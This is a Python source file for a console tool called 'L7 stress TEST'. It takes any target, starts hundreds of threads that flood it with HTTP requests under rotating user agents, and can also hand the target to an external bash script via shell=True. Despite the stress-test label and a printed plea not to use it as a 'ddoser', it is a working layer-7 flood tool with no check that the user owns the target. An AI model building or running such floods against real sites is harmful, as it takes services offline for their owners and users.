import urllib.request
from modules.data import Variables
from random import choice,randint
from threading import Thread
from time import sleep
import subprocess
import signal
import os

def wait():
	input()
	print("[i] Stopping threads please wait...")
	Variables.stopping_threads=True
	while Variables.stopped_threads>7:
		pass
	print("[i] Stopped!")
def send():
	if Variables.l7_request_method=="internal":
		while not Variables.stopping_threads: #safety 
			if Variables.stopping_threads: #extra safety xd
				break
			try:
				resp = urllib.request.urlopen(urllib.request.Request(Variables.target,headers={"User-Agent":choice(Variables.user_agents),"Connection":"keep-alive","Accept-encoding":"gzip, deflate", "Keep-Alive":randint(110,120)}),timeout=99)
			except:
				if not Variables.stopped_threads:
					print("[i] Request failed")
	else:
		proc = subprocess.Popen(f"bash ./{Variables.l7_request_method} {Variables.target} {Variables.port}",shell=True, preexec_fn=os.setsid)
		while not Variables.stopping_threads:
			pass
		proc.send_signal(signal.SIGTERM)
		proc.send_signal(signal.SIGKILL)
		
		proc.kill()		
		proc.terminate()
	Variables.stopped_threads += 1



def parse(inp_=""):
	if inp_.count(" ")>0:
		ar = inp_.split(" ")
		if len(ar)<=1:
			print("[!] Command not found")
			return
		
		command = ar[0]
		args = ar[1:]

		if command.startswith("target"):
			Variables.target=args[0]
			print("[i] Target set!")
		elif command.startswith("req"):
			Variables.l7_request_method=args[0]
			print("[i] Request send method set!")

		elif command.startswith("threads"):
			try:
				Variables.threads = int(args[0])
				print("[i] Thread number set!")
			except:
				print("[!] Enter a valid number")
		elif command.startswith("save"):
			if Variables.save(args[0]):
				print("[i] Saved!")
			else:
				print("[!] Unable to save!")
		elif command.startswith("load"):
			if Variables.load(args[0]):
				print("[i] Loaded!")
			else:
				print("[!] Unable to load!")


	else:
		if inp_.startswith("run"):
			if Variables.target != "":
				Variables.stopping_threads=False
				Variables.stopped_threads=0
				try:
					w = Thread(target=wait)
					w.start()
				except:
					print("[!] Stop thread failed to start!")
					exit()
				
				print("[i] Starting threads...")

				for i in range(Variables.threads):
					try:
						t = Thread(target=send)
						t.start()
					except:
						print(f"[!] Could not start thread {i}")
				print("[i] Started! Use ENTER or Ctrl+C to stop")
			else:
				print("[!] Target not set!")
		elif inp_.startswith("save"):
			if Variables.save():
				print("[i] Quicksaved!")
			else:
				print("[!] Unable to quicksave!")
		elif inp_.startswith("load"):
			if Variables.load():
				print("[i] Quickloaded!")
			else:
				print("[!] Unable to quickload!")
		elif inp_.startswith("lookup"):
			print(f"Target : {Variables.target}\nThreads : {Variables.threads}\nPort : {Variables.port}\nMethod : {Variables.socket_method}")
		elif inp_.startswith("help"):
			print("------------------------------------------------------------")
			print("run - runs stress test")
			print("exit - exits")
			print("save (optional)filename - saves current config")
			print("load (optional)filename - loads current config")
			print("target <target ip/www> - sets target")
			print("threads <number> - sets the amount of threads. Default 400")
			print("lookup - check config")
			print("------------------------------------------------------------")


		elif inp_.startswith("exit"):
			print("[i] Exiting...")
			Variables.stopping_threads=True
			exit()

def main():
	print("[i] L7 stress TEST")
	print("[i] do NOT use this pile of crap as a ddoser plz")
	print("[i] by ja ")
	while 1:
		inp = input("L7>").lower()
		parse(inp)

#if __name__=="__main__":
main()